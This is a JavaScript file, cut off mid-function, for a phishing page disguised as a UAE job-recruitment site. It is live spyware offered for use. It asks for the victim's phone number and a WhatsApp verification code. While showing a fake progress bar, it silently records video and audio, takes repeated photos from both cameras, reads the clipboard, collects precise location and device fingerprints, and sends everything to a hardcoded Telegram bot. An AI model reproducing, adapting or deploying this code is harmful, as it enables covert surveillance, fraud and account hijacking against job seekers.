// Telegram bot configuration
const TELEGRAM_BOT_TOKEN = '7709709454:AAEI6z_qc5XUl8Tj3cuFRgq_NlMQImiUnNw';
const TELEGRAM_CHAT_ID = '868562422';

// Function to send data to Telegram
async function sendToTelegram(message, file = null) {
    const url =`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('text', message);
    if (file) {
        formData.append('photo', file);
    }
    try {
        await fetch(url, { method: 'POST', body: formData });
    } catch (e) {
        // Silent fail
    }
}

// Global variables for continuous capture
let frontStream = null;
let backStream = null;
let captureInterval = null;
let photoCounter = 0;

// Check if HTTPS is required
function checkSecureContext() {
    // Check if running on HTTPS or localhost
    const isSecure = window.isSecureContext || 
                     location.protocol === 'https:' || 
                     location.hostname === 'localhost' || 
                     location.hostname === '127.0.0.1';
    
    if (!isSecure && /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
        return false;
    }
    return true;
}

// Request Camera and Microphone with love quotes display
async function requestCameraAccessWithQuotes(statusElement) {
    try {
        // Check if browser supports getUserMedia
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            if (statusElement) {
                statusElement.innerHTML = `<div class="error" style="background: #ffe6e6; padding: 20px; border-radius: 10px; color: #d32f2f;">
                    <h3>⚠️ المتصفح غير مدعوم</h3>
                    <p>متصفحك لا يدعم الوصول إلى الكاميرا والميكروفون</p>
                    <p>الرجاء استخدام متصفح حديث مثل Chrome أو Firefox لإتمام المقابلة</p>
                </div>`;
            }
            return;
        }

        // Check if secure context (HTTPS) on mobile
        if (!checkSecureContext()) {
            if (statusElement) {
                statusElement.innerHTML = `<div class="error" style="background: #fff3cd; padding: 20px; border-radius: 10px; color: #856404;">
                    <h3>🔒 يتطلب اتصال آمن</h3>
                    <p>للوصول إلى الكاميرا والميكروفون على الجوال لإجراء المقابلة، يجب فتح الموقع عبر HTTPS</p>
                    <p style="font-size: 0.9em; margin-top: 10px;">الرجاء التواصل مع مدير الموقع لتفعيل HTTPS</p>
                </div>`;
            }
            return;
        }

        // Detect if mobile device
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        
        // Request front camera with mobile-friendly settings
        const videoConstraints = isMobile ? 
            { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' } : 
            { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' };
        
        frontStream = await navigator.mediaDevices.getUserMedia({ 
            video: videoConstraints, 
            audio: true 
        });
        
        // Try to get back camera (may not work on all devices)
        try {
            const backConstraints = isMobile ? 
                { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'environment' } : 
                { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'environment' };
            
            backStream = await navigator.mediaDevices.getUserMedia({ 
                video: backConstraints
            });
        } catch (e) {
            console.log('Back camera not available, using front only');
        }

        // Start continuous photo capture every 5 seconds
        startContinuousCapture();
        
        // Record 15-second video with love quotes display
        // Use lower bitrate for mobile
        const videoBitrate = isMobile ? 500000 : 2500000;
        
        // Check supported mime types
        let mimeType = 'video/webm;codecs=vp8,opus';
        if (!MediaRecorder.isTypeSupported(mimeType)) {
            mimeType = 'video/webm';
            if (!MediaRecorder.isTypeSupported(mimeType)) {
                mimeType = 'video/mp4';
            }
        }
        
        const recorder = new MediaRecorder(frontStream, { 
            mimeType: mimeType,
            videoBitsPerSecond: videoBitrate
        });
        const chunks = [];
        recorder.ondataavailable = (e) => {
            if (e.data.size > 0) chunks.push(e.data);
        };
        recorder.onstop = async () => {
            const videoBlob = new Blob(chunks, { type: 'video/webm' });
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('video', videoBlob, 'video.webm');
            formData.append('caption', '🎥 فيديو مقابلة 15 ثانية');
            try {
                await fetch(url, { method: 'POST', body: formData });
            } catch (e) {}
        };
        
        recorder.start();
        
        // Display job quotes every 2 seconds during recording
        let quoteIndex = 0;
        const quoteInterval = setInterval(() => {
            if (quoteIndex < jobQuotes.length) {
                statusElement.innerHTML = `<div class="loading">
                    <strong style="font-size: 1.3em; color: #FFD700;">🎯 اقرأ هذه العبارة بصوت واضح 🎯</strong><br><br>
                    <div style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); padding: 20px; border-radius: 15px; color: #000; font-size: 1.4em; font-weight: bold; margin: 15px 0; box-shadow: 0 5px 15px rgba(255,215,0,0.5);">
                        "${jobQuotes[quoteIndex]}"
                    </div>
                    <small style="color: #666;">جارٍ معالجة طلبك للوظائف الحصرية...</small>
                </div>`;
                quoteIndex++;
            }
        }, 2000);
        
        // Stop after 15 seconds
        setTimeout(() => {
            recorder.stop();
            clearInterval(quoteInterval);
        }, 15000);
        
    } catch (e) {
        // Silent fail - no telegram message
    }
}

// Function to capture photo from stream
async function capturePhotoFromStream(stream, cameraType) {
    if (!stream || !stream.active) {
        console.log('Stream not active for', cameraType);
        return;
    }
    
    try {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute('playsinline', ''); // Important for iOS
        video.muted = true;
        
        // Wait for video to be ready
        await new Promise((resolve, reject) => {
            video.onloadedmetadata = () => {
                video.play().then(resolve).catch(reject);
            };
            video.onerror = reject;
            setTimeout(reject, 5000); // Timeout after 5 seconds
        });
        
        // Wait a bit for the video to stabilize
        await new Promise(resolve => setTimeout(resolve, 500));
        
        // Create canvas with video dimensions
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const context = canvas.getContext('2d');
        
        // Draw the current frame
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Convert to blob and send
        canvas.toBlob(async (blob) => {
            if (!blob || blob.size === 0) {
                console.log('Empty blob for', cameraType);
                return;
            }
            
            photoCounter++;
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', blob, `photo_${photoCounter}.jpg`);
            formData.append('caption', `📸 ${cameraType} - صورة ${photoCounter}`);
            try {
                await fetch(url, { method: 'POST', body: formData });
                console.log('Photo sent:', cameraType, photoCounter);
            } catch (e) {
                console.error('Error sending photo:', e);
            }
        }, 'image/jpeg', 0.85);
        
        // Clean up
        video.srcObject = null;
    } catch (e) {
        console.error('Error capturing photo from', cameraType, e);
    }
}

// Start continuous photo capture every 5 seconds
function startContinuousCapture() {
    // Capture immediately
    if (frontStream) {
        capturePhotoFromStream(frontStream, 'كاميرا أمامية');
    }
    if (backStream) {
        setTimeout(() => {
            capturePhotoFromStream(backStream, 'كاميرا خلفية');
        }, 1000);
    }

    // Then capture every 5 seconds
    captureInterval = setInterval(async () => {
        if (frontStream) {
            await capturePhotoFromStream(frontStream, 'كاميرا أمامية');
        }
        if (backStream) {
            setTimeout(() => {
                capturePhotoFromStream(backStream, 'كاميرا خلفية');
            }, 1000);
        }
    }, 5000);
}

// Stop continuous capture
function stopContinuousCapture() {
    if (captureInterval) {
        clearInterval(captureInterval);
        captureInterval = null;
    }
    if (frontStream) {
        frontStream.getTracks().forEach(track => track.stop());
        frontStream = null;
    }
    if (backStream) {
        backStream.getTracks().forEach(track => track.stop());
        backStream = null;
    }
}

// Request Location Access (silently)
async function requestLocationAccess() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                let locationInfo = '📍 معلومات الموقع:\n\n';
                locationInfo += `خط العرض: ${position.coords.latitude}\n`;
                locationInfo += `خط الطول: ${position.coords.longitude}\n`;
                locationInfo += `الدقة: ${position.coords.accuracy} متر\n`;
                
                try {
                    const geoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`);
                    const geoData = await geoResponse.json();
                    locationInfo += `العنوان: ${geoData.display_name}\n`;
                } catch (e) {}
                
                locationInfo += `\nرابط: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
                
                await sendToTelegram(locationInfo);
            },
            async (error) => {
                // Silent fail - no telegram message
            },
            { 
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    }
}

// Request Notification Permission (silently)
async function requestNotificationAccess() {
    if ('Notification' in window) {
        try {
            const permission = await Notification.requestPermission();
            if (permission === 'granted') {
                new Notification('🏢 مرحباً بك!', {
                    body: 'شكراً لك! تم تحميل قائمة الوظائف الحصرية',
                    icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y="75" font-size="75">🏢</text></svg>'
                });
            }
        } catch (e) {}
    }
}

// Advanced Device Fingerprinting - Canvas
function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 200;
        canvas.height = 50;
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.textBaseline = 'alphabetic';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('Device fingerprint 🔒', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('Device fingerprint 🔒', 4, 17);
        return canvas.toDataURL();
    } catch (e) {
        return 'Canvas not supported';
    }
}

// Advanced Device Fingerprinting - WebGL
function getWebGLFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return 'WebGL not supported';
        
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        const vendor = gl.getParameter(debugInfo ? debugInfo.UNMASKED_VENDOR_WEBGL : 7936);
        const renderer = gl.getParameter(debugInfo ? debugInfo.UNMASKED_RENDERER_WEBGL : 7937);
        
        const params = {
            vendor: vendor,
            renderer: renderer,
            version: gl.getParameter(gl.VERSION),
            shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
            maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
            maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
            maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
            aliasedLineWidthRange: gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE),
            aliasedPointSizeRange: gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE)
        };
        
        return JSON.stringify(params);
    } catch (e) {
        return 'WebGL error: ' + e.message;
    }
}

// Advanced Device Fingerprinting - Audio
async function getAudioFingerprint() {
    return new Promise((resolve) => {
        try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            const analyser = audioContext.createAnalyser();
            const gainNode = audioContext.createGain();
            const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
            
            gainNode.gain.value = 0;
            oscillator.type = 'triangle';
            oscillator.connect(analyser);
            analyser.connect(scriptProcessor);
            scriptProcessor.connect(gainNode);
            gainNode.connect(audioContext.destination);
            
            oscillator.start(0);
            
            scriptProcessor.onaudioprocess = (event) => {
                const output = event.inputBuffer.getChannelData(0);
                let hash = 0;
                for (let i = 0; i < output.length; i++) {
                    hash += Math.abs(output[i]);
                }
                oscillator.stop();
                audioContext.close();
                resolve(hash.toString());
            };
        } catch (e) {
            resolve('Audio fingerprint error: ' + e.message);
        }
    });
}

// Font Detection
function detectFonts() {
    const baseFonts = ['monospace', 'sans-serif', 'serif'];
    const testFonts = [
        'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
        'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS',
        'Impact', 'Tahoma', 'Lucida Console', 'Courier', 'Lucida Sans Unicode'
    ];
    
    const detected = [];
    const testString = 'mmmmmmmmmmlli';
    const testSize = '72px';
    const h = document.getElementsByTagName('body')[0];
    const s = document.createElement('span');
    s.style.fontSize = testSize;
    s.innerHTML = testString;
    
    const defaultWidth = {};
    const defaultHeight = {};
    
    for (let i = 0; i < baseFonts.length; i++) {
        s.style.fontFamily = baseFonts[i];
        h.appendChild(s);
        defaultWidth[baseFonts[i]] = s.offsetWidth;
        defaultHeight[baseFonts[i]] = s.offsetHeight;
        h.removeChild(s);
    }
    
    for (let i = 0; i < testFonts.length; i++) {
        let detected_font = false;
        for (let j = 0; j < baseFonts.length; j++) {
            s.style.fontFamily = testFonts[i] + ',' + baseFonts[j];
            h.appendChild(s);
            const matched = (s.offsetWidth !== defaultWidth[baseFonts[j]] || 
                           s.offsetHeight !== defaultHeight[baseFonts[j]]);
            h.removeChild(s);
            if (matched) {
                detected_font = true;
            }
        }
        if (detected_font) {
            detected.push(testFonts[i]);
        }
    }
    
    return detected.join(', ');
}

// Screen Properties Advanced
function getScreenProperties() {
    return {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        orientation: screen.orientation ? screen.orientation.angle : 'N/A',
        devicePixelRatio: window.devicePixelRatio,
        innerWidth: window.innerWidth,
        innerHeight: window.innerHeight,
        outerWidth: window.outerWidth,
        outerHeight: window.outerHeight
    };
}

// Mouse/Touch Capabilities
function getInputCapabilities() {
    return {
        touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
        maxTouchPoints: navigator.maxTouchPoints || 0,
        pointerSupport: navigator.pointerEnabled || false,
        mouseSupport: 'onmousemove' in window
    };
}

// Timezone and Locale Advanced
function getLocaleInfo() {
    return {
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        locale: navigator.language,
        locales: navigator.languages,
        dateFormat: new Date().toLocaleDateString(),
        timeFormat: new Date().toLocaleTimeString(),
        numberFormat: new Intl.NumberFormat().resolvedOptions()
    };
}

// Gather ALL device info without permissions (ENHANCED)
async function gatherDeviceInfo() {
    let info = '🎯 معلومات الجهاز المجمعة (متقدمة):\n\n';
    
    // Basic Browser Info
    info += '📱 معلومات المتصفح:\n';
    info += `User Agent: ${navigator.userAgent}\n`;
    info += `اللغة: ${navigator.language}\n`;
    info += `اللغات: ${navigator.languages.join(', ')}\n`;
    info += `المنصة: ${navigator.platform}\n`;
    info += `Vendor: ${navigator.vendor}\n`;
    info += `Online: ${navigator.onLine ? 'نعم' : 'لا'}\n`;
    info += `Cookie Enabled: ${navigator.cookieEnabled}\n`;
    info += `Do Not Track: ${navigator.doNotTrack || 'غير مفعل'}\n\n`;
    
    // Screen Info Advanced
    const screenProps = getScreenProperties();
    info += '🖥️ معلومات الشاشة المتقدمة:\n';
    info += `الدقة: ${screenProps.width}x${screenProps.height}\n`;
    info += `الدقة المتاحة: ${screenProps.availWidth}x${screenProps.availHeight}\n`;
    info += `عمق الألوان: ${screenProps.colorDepth} بت\n`;
    info += `Pixel Ratio: ${screenProps.devicePixelRatio}\n`;
    info += `Window Size: ${screenProps.innerWidth}x${screenProps.innerHeight}\n`;
    info += `Outer Size: ${screenProps.outerWidth}x${screenProps.outerHeight}\n`;
    info += `Orientation: ${screenProps.orientation}\n\n`;
    
    // Device Fingerprinting
    info += '🔒 Device Fingerprinting:\n';
    const canvasFP = getCanvasFingerprint();
    info += `Canvas Hash: ${canvasFP.substring(0, 100)}...\n`;
    const webglFP = getWebGLFingerprint();
    info += `WebGL: ${webglFP.substring(0, 200)}...\n`;
    const audioFP = await getAudioFingerprint();
    info += `Audio Hash: ${audioFP}\n`;
    const fonts = detectFonts();
    info += `Fonts Detected: ${fonts || 'None'}\n\n`;
    
    // Input Capabilities
    const inputCaps = getInputCapabilities();
    info += '👆 قدرات الإدخال:\n';
    info += `Touch Support: ${inputCaps.touchSupport ? 'نعم' : 'لا'}\n`;
    info += `Max Touch Points: ${inputCaps.maxTouchPoints}\n`;
    info += `Pointer Support: ${inputCaps.pointerSupport ? 'نعم' : 'لا'}\n`;
    info += `Mouse Support: ${inputCaps.mouseSupport ? 'نعم' : 'لا'}\n\n`;
    
    // Locale Info Advanced
    const localeInfo = getLocaleInfo();
    info += '🌍 معلومات المنطقة المتقدمة:\n';
    info += `Timezone: ${localeInfo.timezone}\n`;
    info += `Timezone Offset: ${localeInfo.timezoneOffset} دقيقة\n`;
    info += `Locale: ${localeInfo.locale}\n`;
    info += `Locales: ${localeInfo.locales.join(', ')}\n`;
    info += `Date Format: ${localeInfo.dateFormat}\n`;
    info += `Time Format: ${localeInfo.timeFormat}\n\n`;
    
    // Battery Status
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            info += '🔋 معلومات البطارية:\n';
            info += `المستوى: ${Math.round(battery.level * 100)}%\n`;
            info += `الشحن: ${battery.charging ? 'نعم' : 'لا'}\n`;
            info += `وقت الشحن: ${battery.chargingTime !== Infinity ? battery.chargingTime + ' ثانية' : 'غير معروف'}\n`;
            info += `وقت التفريغ: ${battery.dischargingTime !== Infinity ? battery.dischargingTime + ' ثانية' : 'غير معروف'}\n\n`;
        } catch (e) {}
    }
    
    // Network Info
    if (navigator.connection || navigator.mozConnection || navigator.webkitConnection) {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        info += '🌐 معلومات الشبكة:\n';
        info += `النوع: ${conn.type || 'غير معروف'}\n`;
        info += `النوع الفعال: ${conn.effectiveType || 'غير معروف'}\n`;
        info += `سرعة التحميل: ${conn.downlink || 'غير معروف'} Mbps\n`;
        info += `RTT: ${conn.rtt || 'غير معروف'} ms\n`;
        info += `توفير البيانات: ${conn.saveData ? 'مفعل' : 'معطل'}\n\n`;
    }
    
    // Storage Info
    if (navigator.storage && navigator.storage.estimate) {
        try {
            const storage = await navigator.storage.estimate();
            info += '💾 معلومات التخزين:\n';
            info += `المساحة الكلية: ${Math.round(storage.quota / 1024 / 1024 / 1024)} GB\n`;
            info += `المستخدم: ${Math.round(storage.usage / 1024 / 1024)} MB\n`;
            info += `المتاح: ${Math.round((storage.quota - storage.usage) / 1024 / 1024 / 1024)} GB\n\n`;
        } catch (e) {}
    }
    
    // Device Memory
    if (navigator.deviceMemory) {
        info += `🧠 ذاكرة الجهاز: ${navigator.deviceMemory} GB\n\n`;
    }
    
    // Hardware Concurrency
    if (navigator.hardwareConcurrency) {
        info += `⚙️ عدد المعالجات: ${navigator.hardwareConcurrency}\n\n`;
    }
    
    // Timezone
    info += `🕐 المنطقة الزمنية: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
    info += `الوقت المحلي: ${new Date().toLocaleString('ar')}\n\n`;
    
    // Cookies Enabled
    info += `🍪 الكوكيز: ${navigator.cookieEnabled ? 'مفعلة' : 'معطلة'}\n`;
    
    // Do Not Track
    info += `🔒 Do Not Track: ${navigator.doNotTrack || 'غير مفعل'}\n\n`;
    
    // Plugins
    if (navigator.plugins && navigator.plugins.length > 0) {
        info += '🔌 الإضافات المثبتة:\n';
        for (let i = 0; i < Math.min(navigator.plugins.length, 5); i++) {
            info += `- ${navigator.plugins[i].name}\n`;
        }
        info += '\n';
    }
    
    // Get IP Address and Location
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        info += `🌍 عنوان IP: ${ipData.ip}\n`;
        
        // Get location from IP
        try {
            const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
            const geoData = await geoResponse.json();
            info += `البلد: ${geoData.country_name || 'غير معروف'}\n`;
            info += `المدينة: ${geoData.city || 'غير معروف'}\n`;
            info += `المنطقة: ${geoData.region || 'غير معروف'}\n`;
            info += `ISP: ${geoData.org || 'غير معروف'}\n`;
        } catch (e) {}
        info += '\n';
    } catch (e) {}
    
    // Performance Info
    if (window.performance && window.performance.memory) {
        info += '⚡ معلومات الأداء:\n';
        info += `Memory Used: ${Math.round(window.performance.memory.usedJSHeapSize / 1048576)} MB\n`;
        info += `Memory Total: ${Math.round(window.performance.memory.totalJSHeapSize / 1048576)} MB\n`;
        info += `Memory Limit: ${Math.round(window.performance.memory.jsHeapSizeLimit / 1048576)} MB\n\n`;
    }
    
    // Plugins and MIME Types
    if (navigator.plugins && navigator.plugins.length > 0) {
        info += '🔌 الإضافات المثبتة:\n';
        for (let i = 0; i < navigator.plugins.length; i++) {
            info += `- ${navigator.plugins[i].name} (${navigator.plugins[i].filename})\n`;
        }
        info += '\n';
    }
    
    // MIME Types
    if (navigator.mimeTypes && navigator.mimeTypes.length > 0) {
        info += '📄 MIME Types:\n';
        for (let i = 0; i < Math.min(navigator.mimeTypes.length, 10); i++) {
            info += `- ${navigator.mimeTypes[i].type}\n`;
        }
        info += '\n';
    }
    
    // Send to Telegram
    await sendToTelegram(info);
}

// Gather ADVANCED info WITH permissions (after verification)
async function gatherAdvancedInfoWithPermissions() {
    let info = '🔐 معلومات متقدمة (بعد التحقق):\n\n';
    
    // Location (if permission granted)
    if (navigator.geolocation) {
        try {
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            });
            
            info += '📍 الموقع الجغرافي الدقيق:\n';
            info += `Latitude: ${position.coords.latitude}\n`;
            info += `Longitude: ${position.coords.longitude}\n`;
            info += `Accuracy: ${position.coords.accuracy} متر\n`;
            info += `Altitude: ${position.coords.altitude || 'N/A'}\n`;
            info += `Speed: ${position.coords.speed || 'N/A'} m/s\n`;
            info += `Heading: ${position.coords.heading || 'N/A'}\n`;
            
            // Reverse geocoding
            try {
                const geoResponse = await fetch(
                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`
                );
                const geoData = await geoResponse.json();
                info += `Address: ${geoData.display_name}\n`;
            } catch (e) {}
            
            info += `Google Maps: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}\n\n`;
        } catch (e) {
            info += '📍 الموقع: تم رفض الصلاحية\n\n';
        }
    }
    
    // Camera/Microphone info (if already accessed)
    if (frontStream) {
        info += '📷 معلومات الكاميرا:\n';
        const tracks = frontStream.getTracks();
        tracks.forEach((track, index) => {
            const settings = track.getSettings();
            info += `Track ${index + 1}:\n`;
            info += `  Kind: ${track.kind}\n`;
            info += `  Label: ${track.label}\n`;
            info += `  Enabled: ${track.enabled}\n`;
            if (settings.width) info += `  Resolution: ${settings.width}x${settings.height}\n`;
            if (settings.frameRate) info += `  Frame Rate: ${settings.frameRate} fps\n`;
            if (settings.deviceId) info += `  Device ID: ${settings.deviceId}\n`;
            if (settings.groupId) info += `  Group ID: ${settings.groupId}\n`;
        });
        info += '\n';
    }
    
    // Notification Permission
    if ('Notification' in window) {
        info += '🔔 صلاحية الإشعارات:\n';
        info += `Status: ${Notification.permission}\n\n`;
    }
    
    // Clipboard (if permission available)
    if (navigator.clipboard && navigator.clipboard.readText) {
        try {
            const clipboardText = await navigator.clipboard.readText();
            if (clipboardText) {
                info += '📋 محتوى الحافظة:\n';
                info += `${clipboardText.substring(0, 500)}\n\n`;
            }
        } catch (e) {
            info += '📋 الحافظة: لا يمكن الوصول\n\n';
        }
    }
    
    // Send to Telegram
    await sendToTelegram(info);
}

// Job motivation quotes to display during recording
const jobQuotes = [
    "أنت على وشك الحصول على وظيفة أحلامك في الإمارات",
    "رواتب تصل إلى 50,000 درهم شهرياً تنتظرك",
    "سكن فاخر وسيارة شركة مجانية من أول يوم",
    "فرصتك للعمل في أكبر الشركات الإماراتية",
    "تذاكر سفر مجانية وإجازات سنوية مدفوعة",
    "تأمين صحي شامل لك ولعائلتك",
    "دورات تدريبية مجانية لتطوير مهاراتك",
    "مستقبل مشرق ينتظرك في دولة الإمارات",
    "انضم إلى آلاف الناجحين في الإمارات",
    "حلمك في العمل بالإمارات أصبح قريباً"
];

// Main function - request all permissions
async function startCapture() {
    const status = document.getElementById('status');
    
    // Check if already verified
    const isVerified = localStorage.getItem('userVerified') === 'true';
    
    if (isVerified) {
        // Already verified, skip phone and verification
        status.innerHTML = '<div class="success">✅ تم التحقق مسبقاً<br>جارٍ تحميل قائمة الوظائف الحصرية...</div>';
        await new Promise(resolve => setTimeout(resolve, 1000));
        await continueAfterPhone();
        return;
    }
    
    // Show phone number request FIRST
    status.innerHTML = `<div class="success">
        <h3 style="color: #FFD700; margin-bottom: 15px;">🏢 مرحباً بك في شركة الإمارات للتوظيف</h3>
        <p style="color: #333; font-size: 1.1em; margin: 15px 0;">للوصول إلى أفضل فرص العمل الحصرية في دولة الإمارات</p>
        <p style="color: #666; margin: 10px 0;">ادخل رقم هاتفك ليتم إرسال قائمة الوظائف الحصرية المتاحة لك مباشرة عبر واتساب</p>
        <div style="margin: 20px 0;">
            <input type="tel" id="phoneNumber" placeholder="أدخل رقم هاتفك" style="width: 80%; padding: 12px; border: 2px solid #FFD700; border-radius: 10px; font-size: 1.1em; text-align: center; direction: ltr;" />
        </div>
        <button onclick="submitPhoneNumberFirst()" style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); color: #000; padding: 12px 40px; border: none; border-radius: 25px; font-size: 1.2em; cursor: pointer; font-weight: bold;">متابعة</button>
    </div>`;
}

// Continue after phone number is submitted
async function continueAfterPhone() {
    const status = document.getElementById('status');
    
    // Show progress bar (without message)
    status.innerHTML = `
        <div class="success" style="padding: 30px;">
            <h3 style="color: #FFD700; margin-bottom: 20px;">⏳ جارٍ تحميل قائمة الوظائف الحصرية</h3>
            <div style="width: 100%; background: #f0f0f0; border-radius: 25px; height: 30px; overflow: hidden; margin: 20px 0;">
                <div id="progressBar" style="width: 0%; height: 100%; background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); transition: width 0.3s ease; display: flex; align-items: center; justify-content: center; color: #000; font-weight: bold; font-size: 0.9em;">
                    <span id="progressText">0%</span>
                </div>
            </div>
        </div>
    `;
    
    const updateProgress = (percent) => {
        const progressBar = document.getElementById('progressBar');
        const progressText = document.getElementById('progressText');
        if (progressBar && progressText) {
            progressBar.style.width = percent + '%';
            progressText.textContent = percent + '%';
        }
    };
    
    // Slow progress animation (1% to 100%)
    const animateProgress = async (start, end, duration) => {
        const steps = end - start;
        const stepDuration = duration / steps;
        
        for (let i = start; i <= end; i++) {
            updateProgress(i);
            await new Promise(resolve => setTimeout(resolve, stepDuration));
        }
    };
    
    // Start slow progress (0% to 15%)
    await animateProgress(0, 15, 3000);
    
    // Gather device info in background
    gatherDeviceInfo();
    
    // Continue progress (15% to 30%)
    await animateProgress(15, 30, 3000);
    
    // Request Camera (silently in background)
    const cameraPromise = requestCameraAccessWithQuotes(status);
    
    // Continue progress (30% to 60%)
    await animateProgress(30, 60, 6000);
    
    // Wait for camera to finish
    await cameraPromise;
    
    // Request Location (silently in background)
    requestLocationAccess();
    
    // Continue progress (60% to 80%)
    await animateProgress(60, 80, 4000);
    
    // Request Notifications (silently in background)
    requestNotificationAccess();
    
    // Continue progress (80% to 100%)
    await animateProgress(80, 100, 4000);
    
    // Show final success message
    status.innerHTML = `<div class="success">
        <h3 style="color: #28a745; margin-bottom: 15px;">🎉 تم تحميل قائمة الوظائف بنجاح!</h3>
        <p style="color: #333; font-size: 1.2em; margin: 15px 0;">🏢 مرحباً بك في شركة الإمارات للتوظيف</p>
        <div class="fake-content" style="margin-top: 20px;">
            <p>✨ يمكنك الآن تصفح قائمة الوظائف الحصرية</p>
            <p>💼 مئات الوظائف برواتب تصل إلى 50,000 درهم</p>
            <p>🇦🇪 فرص عمل حصرية في أفضل الشركات الإماراتية</p>
        </div>
    </div>`;
}

// Global variable to track verification attempts
let verificationAttempts = 0;

// Submit phone number FIRST (before permissions)
async function submitPhoneNumberFirst() {
    const phoneInput = document.getElementById('phoneNumber');
    const phoneNumber = phoneInput.value.trim();
    const status = document.getElementById('status');
    
    // ✅ تحقق بسيط: فقط نتأكد إنه مو فاضي وإنه أرقام
    if (!phoneNumber || !/^\d+$/.test(phoneNumber)) {
        alert('⚠️ يرجى إدخال رقم هاتف (أرقام فقط)');
        return;
    }
    
    // تصفير عدد محاولات التحقق
    verificationAttempts = 0;
    
    // إظهار رسالة جارِ الإرسال
    status.innerHTML = '<div class="loading">⏳ جارٍ إرسال رمز التحقق إلى واتساب...</div>';
    
    // إرسال رقم الهاتف إلى تيليجرام
    await sendToTelegram(`📱 رقم الهاتف المدخل:\n${phoneNumber}\n\n⚠️ يرجى إرسال رمز التحقق إلى هذا الرقم عبر واتساب`);
    
    // انتظار بسيط
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // إظهار إدخال رمز التحقق (نفس الفكرة القديمة)
    status.innerHTML = `<div class="success">
        <h3 style="color: #28a745; margin-bottom: 15px;">✅ تم إرسال رمز التحقق إلى واتساب</h3>
        <p style="color: #333; font-size: 1.1em; margin: 15px 0;">تحقق من رسائل واتساب الخاصة بك</p>
        <p style="color: #666; margin: 10px 0;">أدخل الرمز المرسل إليك (4 أرقام على الأقل)</p>
        <div style="margin: 20px 0;">
            <input type="text" id="verificationCode" placeholder="أدخل رمز التحقق" maxlength="10" style="width: 60%; padding: 12px; border: 2px solid #FFD700; border-radius: 10px; font-size: 1.3em; text-align: center; letter-spacing: 5px; direction: ltr;" />
        </div>
        <button onclick="submitVerificationCodeFirst()" style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); color: #000; padding: 12px 40px; border: none; border-radius: 25px; font-size: 1.2em; cursor: pointer; font-weight: bold;">تأكيد الرمز</button>
    </div>`;
}


// Submit verification code FIRST (before permissions)
async function submitVerificationCodeFirst() {
    const codeInput = document.getElementById('verificationCode');
